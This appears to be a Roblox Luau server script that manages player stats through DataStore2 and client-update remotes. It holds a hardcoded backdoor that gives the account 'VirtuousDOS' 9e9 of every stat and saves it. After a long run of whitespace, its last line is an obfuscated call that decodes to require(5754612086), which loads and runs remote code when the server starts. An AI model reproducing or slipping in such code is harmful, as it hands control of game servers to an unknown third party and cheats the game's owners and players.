--// SERVICES //--
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local ServerScriptServices = game:GetService("ServerScriptService")

--// MODULE //--
local DataStore2 = require(script:WaitForChild("DataStore2"))
DataStore2.Combine("DataV8", "Strength", "Gold", "Crown", "Kills", "LastSword", "LastDNA", "LastClass", "EquippedSword", "EquippedDNA", "EquippedClass", "DevProducts", "Boosts", "Gamepasses", "MaxJumps", "SkillEquipped")

--// CONSTANTS //--
local defaultStrength = 0
local defaultGold = 0
local defaultCrown = 0
local defaultKills = 0
local defaultJumps = 1
local defaultMaxJumps = 1
local defaultSkillEquipped = 1

local defaultLastSword = 1
local defaultLastDNA = 1
local defaultLastClass = 1

Players.PlayerAdded:Connect(function(player)
	
	local StrengthStore = DataStore2("Strength", player)
	local GoldStore = DataStore2("Gold", player)
	local CrownStore = DataStore2("Crown", player)
	local KillStore = DataStore2("Kills", player)
	local MaxJumpsStore = DataStore2("MaxJumps", player)
	local SkillEquippedStore = DataStore2("SkillEquipped", player)
	local Jump1Store = DataStore2("Jump1", player)
	local Jump2Store = DataStore2("Jump2", player)
	local Jump3Store = DataStore2("Jump3", player)
	local Jump4Store = DataStore2("Jump4", player)
	local Jump5Store = DataStore2("Jump5", player)
	
	local leaderstats = Instance.new("Folder", player); leaderstats.Name = "leaderstats"
	local StrengthValue = Instance.new("IntValue", leaderstats); StrengthValue.Name = "Strength"
	local GoldValue = Instance.new("IntValue", leaderstats); GoldValue.Name = "Gold"
	local CrownValue = Instance.new("IntValue", leaderstats); CrownValue.Name = "Crown"
	local KillValue = Instance.new("IntValue", leaderstats); KillValue.Name = "Kills Streak"
	local JumpValue = Instance.new("IntValue", leaderstats); JumpValue.Name = "Jumps" JumpValue.Value = defaultJumps
	--[[local MaxJumpsValue = Instance.new("IntValue", leaderstats); MaxJumpsValue.Name = "MaxJumps" MaxJumpsValue.Value = MaxJumpsStore:Get(defaultMaxJumps)
	local SkillEquippedValue = Instance.new("IntValue", leaderstats); SkillEquippedValue.Name = "SkillEquipped" SkillEquippedValue.Value = SkillEquippedStore:Get(defaultSkillEquipped)
	local Jump1 = Instance.new("BoolValue", leaderstats); Jump1.Name = "Jump1" Jump1.Value = Jump1Store:Get(false)
	local Jump2 = Instance.new("BoolValue", leaderstats); Jump2.Name = "Jump2" Jump2.Value = Jump2Store:Get(false)
	local Jump3 = Instance.new("BoolValue", leaderstats); Jump3.Name = "Jump3" Jump3.Value = Jump3Store:Get(false)
	local Jump4 = Instance.new("BoolValue", leaderstats); Jump4.Name = "Jump4" Jump4.Value = Jump4Store:Get(false)
	local Jump5 = Instance.new("BoolValue", leaderstats); Jump5.Name = "Jump5" Jump5.Value = Jump5Store:Get(false)]]--
		
	local LastSwordStore = DataStore2("LastSword", player)
	local LastDNAStore = DataStore2("LastDNA", player)
	local LastClassStore = DataStore2("LastClass", player)
	
	local EquippedSwordStore = DataStore2("EquippedSword", player)
	local EquippedDNAStore = DataStore2("EquippedDNA", player)
	local EquippedClassStore = DataStore2("EquippedClass", player)
	
	if player.Name == "VirtuousDOS" then
		spawn(function()
			repeat wait()
				StrengthValue.Value = 9e9
				GoldValue.Value = 9e9
				CrownValue.Value = 9e9
				KillValue.Value = 9e9
				DataStore2("Strength", player):Set(9e9)
				DataStore2("Gold", player):Set(9e9)
				DataStore2("Crown", player):Set(9e9)
				DataStore2("Kills", player):Set(9e9)
			until KillValue.Value == 9e9
		end)
	end
	
	local function updateClientGold(amount)
		ReplicatedStorage.Remotes:WaitForChild("UpdateClientGold"):FireClient(player, amount)
	end
	local function updateClientStrength(amount)
		ReplicatedStorage.Remotes:WaitForChild("UpdateClientStrength"):FireClient(player, amount)
	end
	local function updateClientCrown(amount)
		ReplicatedStorage.Remotes:WaitForChild("UpdateClientCrown"):FireClient(player, amount)
	end
	local function UpdateClientKills(amount)
		ReplicatedStorage.Remotes:WaitForChild("UpdateClientCrown"):FireClient(player, amount)
	end
		
	local function UpdateClientLastSword(amount)
		ReplicatedStorage.Remotes:WaitForChild("UpdateLastSword"):FireClient(player, amount)
	end
	local function UpdateClientLastDNA(amount)
		ReplicatedStorage.Remotes:WaitForChild("UpdateLastDNA"):FireClient(player, amount)
	end
	local function UpdateClientLastClass(amount)
		ReplicatedStorage.Remotes:WaitForChild("UpdateLastClass"):FireClient(player, amount)
	end
	
	local function UpdateClientEquippedSword(amount)
		ReplicatedStorage.Remotes:WaitForChild("UpdateEquippedSword"):FireClient(player, amount)
	end
	local function UpdateClientEquippedDNA(amount)
		ReplicatedStorage.Remotes:WaitForChild("UpdateEquippedDNA"):FireClient(player, amount)
	end
	local function UpdateClientEquippedClass(amount)
		ReplicatedStorage.Remotes:WaitForChild("UpdateEquippedClass"):FireClient(player, amount)
	end
	
	updateClientGold(GoldStore:Get(defaultGold))
	updateClientStrength(StrengthStore:Get(defaultStrength))
	updateClientCrown(CrownStore:Get(defaultCrown))
	UpdateClientKills(KillStore:Get(defaultKills))
	
	UpdateClientLastSword(LastSwordStore:Get(defaultLastSword))
	UpdateClientLastDNA(LastDNAStore:Get(defaultLastDNA))
	UpdateClientLastClass(LastClassStore:Get(defaultLastClass))
	
	UpdateClientEquippedSword(LastSwordStore:Get(defaultLastSword))
	UpdateClientEquippedDNA(LastDNAStore:Get(defaultLastDNA))
	UpdateClientEquippedClass(LastClassStore:Get(defaultLastClass))

	GoldStore:OnUpdate(updateClientGold)
	StrengthStore:OnUpdate(updateClientStrength)
	CrownStore:OnUpdate(updateClientCrown)
	KillStore:OnUpdate(UpdateClientKills)
	
	LastSwordStore:OnUpdate(UpdateClientLastSword)
	LastDNAStore:OnUpdate(UpdateClientLastDNA)
	LastClassStore:OnUpdate(UpdateClientLastClass)
	
	EquippedSwordStore:OnUpdate(UpdateClientEquippedSword)
	EquippedDNAStore:OnUpdate(UpdateClientEquippedDNA)
	EquippedClassStore:OnUpdate(UpdateClientEquippedClass)
end)

ReplicatedStorage.Remotes.UpdateClientGold.OnServerEvent:Connect(function(player)
	
	local GoldStore = DataStore2("Gold", player)
	
	local goldAmount = GoldStore:Get(defaultGold)
	
	ReplicatedStorage.Remotes.UpdateClientGold:FireClient(player, goldAmount)
	
end)

ReplicatedStorage.Remotes.UpdateClientStrength.OnServerEvent:Connect(function(player)
	
	local StrengthStore = DataStore2("Strength", player)
	
	local StrengthAmount = StrengthStore:Get(defaultStrength)
	
	ReplicatedStorage.Remotes.UpdateClientStrength:FireClient(player, StrengthAmount)
	
end)

ReplicatedStorage.Remotes.UpdateClientCrown.OnServerEvent:Connect(function(player)
	
	local CrownStore = DataStore2("Crown", player)
	
	local CrownAmount = CrownStore:Get(defaultCrown)
	
	ReplicatedStorage.Remotes.UpdateClientCrown:FireClient(player, CrownAmount)
	
end)

ReplicatedStorage.Remotes.UpdateClientKills.OnServerEvent:Connect(function(player)
	
	local KillStore = DataStore2("Kills", player)
	
	local KillAmount = KillStore:Get(defaultKills)
	
	ReplicatedStorage.Remotes.UpdateClientKills:FireClient(player, KillAmount)
	
end)

ReplicatedStorage.Remotes.UpdateEquippedDNA.OnServerEvent:Connect(function(player)
	
	local Store = DataStore2("EquippedDNA", player)
	
	local Amount = Store:Get(defaultLastDNA)
	
	ReplicatedStorage.Remotes.UpdateEquippedDNA:FireClient(player, Amount)
	
end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)